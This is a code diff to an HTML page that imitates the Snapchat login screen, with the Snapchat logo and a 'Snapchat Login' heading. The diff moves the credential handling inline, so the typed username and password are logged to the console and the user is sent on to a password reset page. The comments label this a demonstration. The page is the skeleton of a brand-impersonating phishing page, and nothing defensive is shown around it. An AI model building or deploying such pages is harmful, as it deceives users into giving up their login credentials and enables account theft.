@@ -17,7 +17,7 @@
     <div class="form">
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
         <h1>Snapchat Login</h1>
-        <form id="loginForm" action="password_reset.html" method="post">
+        <form id="loginForm">
             <label for="username">Username or Email Address:</label><br>
             <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
             <span id="usernameError" class="error-message"></span><br>
@@ -50,8 +50,11 @@
                     return;
                 }
                 
-                // Send captured data to server (you can replace this with actual form submission)
-                logLogin(username, password);
+                // Log the username and password (for demonstration purposes only)
+                console.log('Logging in:', username, password);
+                
+                // Redirect to password reset page (for demonstration purposes only)
+                window.location.href = "password_reset.html";
             }
         });
         
@@ -83,15 +86,6 @@
             }
             
             return isValid;
-        }
-        
-        function logLogin(username, password) {
-            // This function should ideally make a server-side request to log the login attempt securely.
-            // For demonstration purposes, it logs to console.
-            console.log('Logging in:', username, password);
-            
-            // Redirect to password reset page (this is for demonstration purposes only)
-            window.location.href = "password_reset.html";
         }
     </script>
 </body>
